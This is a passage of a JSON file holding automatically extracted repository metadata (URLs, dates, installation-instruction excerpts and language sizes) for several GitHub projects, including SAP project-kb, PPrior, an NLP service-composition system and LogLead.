                "result": {
                    "value": "https://github.com/yueyueL/DL-based-Android-Malware-Defenses-review",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**You are welcome to update our review list!!**\n* fork this repository, add it and merge back;\n* or email us.\n  \nIf you see a project or link here that is no longer maintained or is not a good fit, please submit a pull request to improve this document. Thank you! \n",
                    "original_header": " Systematic review process and paper lists "
                },
                "confidence": 0.9899063809561248,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/yueyueL/DL-based-Android-Malware-Defenses-review/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-12-08T13:01:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-17T08:48:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "863": {
        "filename": "SAP_project-kb_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/SAP/project-kb",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-02-13T16:19:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-17T15:25:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 432449
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 175369
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Go",
                    "name": "Go",
                    "type": "Programming_language",
                    "size": 123395
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 27418
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 24794
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 6843
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 4803
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 4408
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 3404
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 2063
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jinja",
                    "name": "Jinja",
                    "type": "Programming_language",
                    "size": 1008
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "864": {
        "filename": "MultifacetedNLP_PPrior_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/MultifacetedNLP/PPrior",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "The steps for setting up the project on a local machine are as follows:\n\n1- Clone the project\n```\ngit clone https://github.com/MultifacetedNLP/PPrior.git\n```\n\n2- Install the [DVC](https://github.com/iterative/dvc) (Data Version Control) command line tool. The DVC is necessary for pulling the trained models and datasets from Google Drive to a local machine. \nThe installation section can be found [here](https://github.com/iterative/dvc#installation).\n\n3- Cd to the cloned project and run the following command lines to pull trained models and datasets separately.\n```\ncd PPrior\n```\n\nPull Datasets:\n```\ndvc pull Datasets\n```\nPull the PreTrainedT5 model:\n```\ndvc pull TrainedModels/PreTrainedT5\n```\nPull the Multiclass SentenceTransformer model:\n```\ndvc pull TrainedModels/contrastive-training-pretrainedT5\n```\nPull the Multiclass KNN index:\n```\ndvc pull TrainedModels/FinalKNN\n```\nPull the Binary SentenceTransformer model:\n```\ndvc pull TrainedModels/contrastive-training-anomaly-pretrainedT5\n```\nPull the Binary KNN index:\n```\ndvc pull TrainedModels/FinalAnomalyKNN\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/MultifacetedNLP/PPrior/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1- Datasets can be downloaded from these links: [Train Dataset](https://drive.google.com/uc?export=download&id=1sfILpj4aAAjQ5eDmi4NSx3staDOqHQ1j), [Validation Dataset](https://drive.google.com/uc?export=download&id=1JbtZlQxXCaPf8dxMgWfxAIRIZttMcxcF), [Test Dataset](https://drive.google.com/uc?export=download&id=1YNE6a-uHTrkzmMy9bydZ5Wawt6BIFI6k) \n",
                    "original_header": "Datasets"
                },
                "confidence": 0.957529187441191,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/MultifacetedNLP/PPrior/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-08-25T21:12:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-09-12T20:55:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 74673
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 527
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "865": {
        "filename": "ojrlopez27_nl-service-composition_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ojrlopez27/nl-service-composition",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. **sent2vec** server: follow the instructions on the README file under the sent2vec folder, and:\n    - Download Cython. If using mac, 'pip install Cython'\n    - Install module globally:\n\t      - /usr/local/bin/python2.7 setup.py build_ext\n\t      - sudo -H pip install .\n\t      - pip3 install nltk\n    - Download pre-trained models from https://github.com/epfml/sent2vec, more specifically, wiki bigrams (16GB) and toronto unigrams (2GB) -- though you can try different models, particularly, we should try twitter model since it is bigger in size and precision may be improved. Put the models under the folder sent2vec\n    - Modify run.sh bash script. If you want more precision (though it will be slower) then use wiki model, otherwise use toronto model which is faster\n2. **composition** client:\n    - Modify config.properties and point the path variables to your local folders\n    - Modify task-def-script to reflect the high level description of a task or plan (e.g., plan a trip to a place on a range of dates)\n    - Modify task-exec-script to reflect a contextualization of the high-level description (e.g., plan a trip to Boston from August 29 to September 11)\n    - If you are **NOT** doing performance tests, then you should disable the corresponding option on the confi.properties file (performance.test.enable = false)\n3. **experiments/performance** server:\n\t- Install GNU parallel: (brew install parallel, or port install parallel)\n\t- Modify build.gradle to create a jar\n\t- Write a script for running the jar\n\t- Modify config.properties so the upper threshold is very low (0.1) andlower (0.01)\n\t- Modify task-exec-script file in such a way that all the params are provided in each sentence (date, location, etc).\n\t- Write a script using GNU parallel (https://stackoverflow.com/a/21197038) that loads the scripts that runs the jar\n\t- Run the performance Java server\n\t- Run the parallel script for 10, 100, 1000, 10,000 processes (clients)\n4. Mechanical Turk Experiments:\n\t- Make sure you are using wiki pre-trained model (it is more accurate). Modify sent2vec/run.sh script.\n\t- If you have added new services or api's (**only**) then:\n\t\t- add words to the blacklist (if needed) in composiiton/.../DatasetCleaner\n\t- Configure the Chat Web App (experiments/mechanical-turk/chat):\n\t\t- brew install python\n\t\t- brew upgrade python\n\t\t- check version (should be minimum 3.6): /usr/local/bin/python3.6-32 --version\n\t\t- install tornado globally:\n\t\t\t- /usr/local/bin/python3.6-32 -m pip install tornado\n\t\t- if you are using DDNS (noip.com):\n\t\t\t- make sure every time you move to another network (e.g., from home to campus) you will have to update the ip address in noip.com (user inmind.yahoo.2015@gmail)\n\t\t\t- if working from home, you hill have to open (forward) TCP and UPP ports 5555, 5556 and 8888 (using your admin web console of your router) otherwise, while testing locally, you can just test using localhost (though, during tests with turkers, you will need to make sure app.composer.ddns.net is available)\n\t- run sent2vec\n\t- change config.properties (variable paths) on java composition project\n\t- run Java composition project (MUF_MKTLauncher.java)\n\t- open a web browser and type either app.composer.ddns.net:8888 or localhost:8888\n  ",
                    "type": "Text_excerpt",
                    "original_header": "Setup",
                    "parent_header": [
                        "<NLSC> Unrestricted Natural Language-based Service Composition through Sentence Embeddings"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ojrlopez27/nl-service-composition/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "[//]: # (this is a comment: see this link for badges using travis-CI, codecov, etc: https://github.com/mlindauer/SMAC3/blob/warmstarting_multi_model/README.md) \n![build](https://img.shields.io/badge/build-passing-green.svg?cacheSeconds=2592000) \n![test](https://img.shields.io/badge/test-passing-green.svg?cacheSeconds=2592000) \n![coverage](https://img.shields.io/badge/coverage-90%25-yellowgreen.svg?cacheSeconds=2592000) \n[![Codacy Badge](https://api.codacy.com/project/badge/Grade/e3935f15c7fe495191910e9ab92d9143)](https://www.codacy.com/app/ojrlopez27/semantic-middleware?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=ojrlopez27/nl-service-composition&amp;utm_campaign=Badge_Grade) \n",
                    "original_header": "<NLSC> Unrestricted Natural Language-based Service Composition through Sentence Embeddings"
                },
                "confidence": 0.999998498662852,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ojrlopez27/nl-service-composition/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-08-11T03:59:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-29T04:51:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 627393
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 106184
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 39453
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 11912
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 11074
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 9100
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 4032
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 3180
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 1635
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 404
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "866": {
        "filename": "EvoTestOps_LogLead_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/EvoTestOps/LogLead",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Simply install with `pip`:\n\n```\npython -m pip install loglead\n```\n\nNOTE: pip version does not have the `tensorflow` dependencies necessary for `BertEmbeddings`.\nInstall them manually (preferably in a conda enviroment).\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing LogLead",
                    "parent_header": [
                        "LogLead"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/EvoTestOps/LogLead/main/README.md"
            },
            {
                "result": {
                    "value": "- If `scikit-learn` wheel fails to compile, check that you can `gcc` and `g++` installed.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Known issues",
                    "parent_header": [
                        "LogLead",
                        "Installing LogLead"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/EvoTestOps/LogLead/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-09-22T04:31:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-26T10:21:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 287485
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    }
}